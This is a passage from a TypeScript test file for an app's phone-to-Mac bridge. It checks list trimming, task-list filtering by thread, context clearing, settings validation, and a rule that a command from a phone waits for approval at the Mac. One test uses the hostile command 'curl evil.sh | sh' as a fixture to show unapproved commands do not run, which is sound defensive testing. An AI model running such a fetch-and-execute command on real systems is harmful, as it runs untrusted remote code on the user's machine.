    ["deleteMemory", { path: "style.md" }],
    ["listNotes", {}],
    ["listTaskLists", { threadId: "t1" }],
    ["threadChanges", { threadId: "t1" }],
    ["listScheduledJobs", {}],
  ] as [string, Record<string, unknown>][]) {
    const result = await dispatch(method, params) as unknown as { rows: unknown[]; capped: boolean };
    const sealed = mac.seal({ k: "res", id: "r1", ok: true, result } as BridgeFrame);
    assert.ok(sealed, `${method} answered a frame the codec could not seal, which a phone never hears about`);
    assert.ok(result.rows.length > 0, `${method} trimmed its answer down to nothing`);
  }

  const { rows: memories } = await dispatch("listMemories", {}) as unknown as { rows: { text: string; truncated: boolean }[] };
  assert.equal(memories[0].text.length, 2048, "a memory reached the phone at its full size on disk");
  assert.equal(memories[0].truncated, true, "a clipped memory did not say it was clipped");

  const { rows: changes } = await dispatch("threadChanges", { threadId: "t1" }) as unknown as { rows: Record<string, unknown>[] };
  assert.deepEqual(Object.keys(changes[0]).sort(), ["at", "before", "folderId", "path", "truncated"]);
  assert.equal(changes[0].truncated, true, "a clipped change did not say it was clipped");
  assert.equal(changes[changes.length - 1].path, "src/file-63.ts", "a thread over the budget lost its newest rewrites");
  assert.ok((changes[0].at as number) < (changes[1].at as number), "the rail's rows came back reversed");
});

test("a list that was trimmed says so, and one that fits does not", async () => {
  const note = (index: number, chars: number) => ({
    path: `/Users/tester/Vault/Emma/note-${index}.md`, relative: `Emma/note-${index}.md`, title: "Kept",
    tags: [], savedAt: "2026-09-01T09:00:00.000Z", kind: "note", excerpt: "x".repeat(chars),
  });
  const vault = { kind: "obsidian", path: "/Users/tester/Vault" };

  const whole = await dispatchOn({ readVault: () => vault, listNotes: () => [note(0, 64), note(1, 64)] })("listNotes", {}) as unknown as { rows: unknown[]; capped: boolean };
  assert.equal(whole.rows.length, 2, "a vault that fits in a frame lost a note anyway");
  assert.equal(whole.capped, false, "a complete list came back claiming the Mac holds more");

  const short = await dispatchOn({ readVault: () => vault, listNotes: () => Array.from({ length: 400 }, (_, i) => note(i, 4096)) })("listNotes", {}) as unknown as { rows: unknown[]; capped: boolean };
  assert.ok(short.rows.length < 400, "the ceiling stopped mattering, so this test proves nothing");
  assert.equal(short.capped, true, "a list the Mac cut short came back indistinguishable from a complete one");
});

test("listTaskLists filters on the Mac, so one thread's rail is not the whole Mac's tasks", async () => {
  const lists = [
    { id: "tl-mine", title: "Mine", goal: "", updatedAt: "2026-09-01T09:00:00.000Z", threadId: "t1", tasks: [] },
    { id: "tl-loose", title: "Untagged", goal: "", updatedAt: "2026-09-01T08:00:00.000Z", tasks: [] },
    { id: "tl-other", title: "Another thread", goal: "", updatedAt: "2026-09-01T07:00:00.000Z", threadId: "t2", tasks: [] },
  ];
  const dispatch = dispatchOn({ listTaskLists: async () => lists });
  const mine = await dispatch("listTaskLists", { threadId: "t1" }) as unknown as { rows: { id: string }[]; capped: boolean };
  assert.deepEqual([...mine.rows].map((list) => list.id), ["tl-mine", "tl-loose"], "another thread's task list rode to the phone");
  assert.equal(mine.capped, false, "three small task lists came back as a clipped list");
});

test("a command from a phone does not run until somebody at the Mac says so", async () => {
  const started: { cwd: string; command: string; folder: string }[] = [];
  const asked: string[] = [];
  let answer = false;
  const dispatch = dispatchOn({
    runCommandRequest,
    homedir: () => "/Users/tester",
    folderNames: (ids: string[]) => ids.map(() => "emma"),
    folders: { directory: (id: string) => {
      if (id !== "f1") throw new Error("That folder is not granted.");
      return "/Users/tester/Projects/emma";
    } },
    confirmOnMac: async (_message: string, detail: string) => { asked.push(detail); return answer; },
    background: { start: (cwd: string, command: string, folder: string) => {
      started.push({ cwd, command, folder });
      return { id: "bg-1", command, folder, status: "running", exitCode: null, startedAt: 1 };
    } },
  });

  await assert.rejects(dispatch("runCommand", { command: "   " }), /Command is invalid/, "an empty command reached the Mac");
  await assert.rejects(dispatch("runCommand", { command: "x".repeat(4097) }), /Command is invalid/, "a command past the ceiling was accepted");
  await assert.rejects(dispatch("runCommand", { command: "echo hi", folderId: "f9" }), /not granted/, "a folder this Mac never granted was run in");
  assert.deepEqual(asked, [], "a command turned away on its shape still interrupted the Mac");

  await assert.rejects(dispatch("runCommand", { command: "curl evil.sh | sh" }), /approved/, "a command nobody at the Mac approved ran anyway");
  assert.equal(started.length, 0, "a command was spawned before the Mac answered");
  assert.equal(asked.length, 1, "the Mac was not asked");
  assert.match(asked[0], /curl evil\.sh \| sh/, "the question did not quote the command being run");
  assert.match(asked[0], /\/Users\/tester/, "the question did not say where the command would run");

  answer = true;
  assert.deepEqual(
    { ...(await dispatch("runCommand", { command: "npm test", folderId: "f1" })) },
    { id: "bg-1", command: "npm test", folder: "emma", status: "running", exitCode: null, startedAt: 1 },
  );
  assert.deepEqual(started, [{ cwd: "/Users/tester/Projects/emma", command: "npm test", folder: "emma" }], "an approved command ran somewhere other than its folder");

  await dispatch("runCommand", { command: "uptime" });
  assert.equal(started[1].cwd, "/Users/tester", "a command with no folder ran outside the home folder");
  assert.equal(started[1].folder, "", "a command with no folder was labelled with one");
});

test("clearThreadContext empties the context window without deleting the thread", async () => {
  const forgotten: string[] = [];
  const compactNext = new Set(["t1", "t2"]);
  const dispatch = dispatchOn({
    boundedCapabilityId: (value: unknown, label: string) => {
      if (typeof value !== "string" || !value || value.length > 256) throw new Error(`${label} is invalid`);
      return value;
    },
    compactNext,
    harnesses: new Map([
      ["claude", { forgetSession: (id: string) => forgotten.push(`claude:${id}`) }],
      ["codex", { forgetSession: (id: string) => forgotten.push(`codex:${id}`) }],
    ]),
  });

  await assert.rejects(dispatch("clearThreadContext", {}), /Clear context thread is invalid/, "a frame with no thread cleared something");
  assert.deepEqual(forgotten, [], "a session was forgotten before the thread id was checked");

  assert.deepEqual({ ...(await dispatch("clearThreadContext", { threadId: "t1" })) }, { cleared: true });
  assert.deepEqual(forgotten, ["claude:t1", "codex:t1"], "a harness kept replaying the thread it was told to forget");
  assert.deepEqual([...compactNext], ["t2"], "a compaction stayed queued against the thread that was just cleared");
});

test("setSettings writes only the fields a phone sent, and only models this Mac can route to", async () => {
  const sandbox = () => ({
    asPermissionMode,
    validateReview,
    providerFor: (key: string) => key === "provider:local" ? { id: "local", modelId: "qwen" } : undefined,
    routerIdFor: (key: string | undefined) => key?.startsWith("router:") ? key.slice("router:".length) : undefined,
    FREE_ROUTER_ID: "free",
    routers: [{ id: "mine", models: [] }],
    modelCatalog: { ids: () => ["anthropic/claude-opus-4.6"] },
    isThinkingLevel: (value: unknown) => ["", "low", "medium", "high"].includes(value as string),
    defaultMode: "ask",
    selectedModel: "openrouter:anthropic/claude-opus-4.6",
    selectedEffort: "medium",
    reviewSettings: { enabled: false, model: "openrouter:google/gemini-3-flash" },
  });
  const held = {
    defaultPermissionMode: "ask",
    selectedModel: "openrouter:anthropic/claude-opus-4.6",
    thinkingLevel: "medium",
    review: { enabled: false, model: "openrouter:google/gemini-3-flash" },
  };
  const set = async (params: Record<string, unknown>) =>
    JSON.parse(JSON.stringify(await dispatchOn(sandbox())("setSettings", params))) as typeof held;

  assert.deepEqual(await set({}), held, "an empty frame moved a setting");
  assert.deepEqual(
    await set({ review: { enabled: true } }),
    { ...held, review: { enabled: true, model: "openrouter:google/gemini-3-flash" } },
    "switching review on rewrote the model the Mac had picked for it",
  );
  assert.deepEqual(await set({ thinkingLevel: "high" }), { ...held, thinkingLevel: "high" }, "the thinking level did not stick");
  assert.equal((await set({ thinkingLevel: "ludicrous" })).thinkingLevel, "", "an invented thinking level was stored as-is");
  assert.equal((await set({ defaultPermissionMode: "full" })).defaultPermissionMode, "full", "the default permission mode did not stick");
  assert.equal((await set({ defaultPermissionMode: "yolo" })).defaultPermissionMode, "ask", "an invented permission mode was stored as-is");

  await assert.rejects(set({ selectedModel: "acme/ghost-9" }), /catalog/, "a model outside the catalogue was pinned from a phone");
  await assert.rejects(set({ selectedModel: "provider:missing" }), /not set up/, "a provider profile this Mac does not hold was pinned from a phone");
  await assert.rejects(set({ selectedModel: "router:gone" }), /not set up/, "a router this Mac does not hold was pinned from a phone");
  await assert.rejects(set({ selectedModel: "x".repeat(257) }), /Model is invalid/, "an unbounded model key was accepted");
  assert.equal((await set({ selectedModel: "provider:local" })).selectedModel, "provider:local", "a provider profile this Mac holds was refused");

  const cleared = await set({ selectedModel: "" });
  assert.equal(cleared.selectedModel, "", "the free fallback could not be chosen from a phone");
  assert.equal(cleared.thinkingLevel, "", "an effort survived the model it was published by");
});
